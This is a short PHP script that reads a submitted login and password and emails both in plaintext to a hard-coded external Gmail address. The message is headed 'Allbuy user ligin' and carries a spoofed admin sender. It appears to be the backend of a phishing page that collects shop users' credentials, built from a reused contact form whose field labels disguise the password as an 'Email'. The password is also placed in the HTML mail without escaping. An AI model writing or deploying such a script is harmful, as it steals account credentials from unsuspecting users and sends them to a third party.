<?php
$email = "desoul2411@gmail.com";// enter email!

$name = $_SERVER['HTTP_HOST'];
//Validation
$client_name = $client_phone = $client_message = ""; // define variables and set to empty values

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = test_input($_POST["login"]);
    $password = $_POST["password"];
}

function test_input($data) {
    $data = trim($data);  //strip unnecessary characters (extra space, tab, newline) from the user input data
    $data = stripslashes($data);  //Remove backslashes (\) from the user input data
    $data = htmlspecialchars($data); //htmlspecialchars() function converts special characters to HTML entities
    return $data;
}


$to = $email;
$subject = 'Message';
$message = '
		<html>
			<head>
				<title>'.$subject.'</title>
			</head>
			<body>
			<b>From Allbuy user ligin</b>
				<p><i>Name - </i> '.$login.'</p>
				<p><i>Email - </i>'.$password.'</p>
			</body>
			</html>';
$headers  = "Content-type: text/html; charset=utf-8 \r\n";
$headers .= "From: ".$name." <admin@".$name.">\r\n";
mail($to, $subject, $message, $headers);
?>

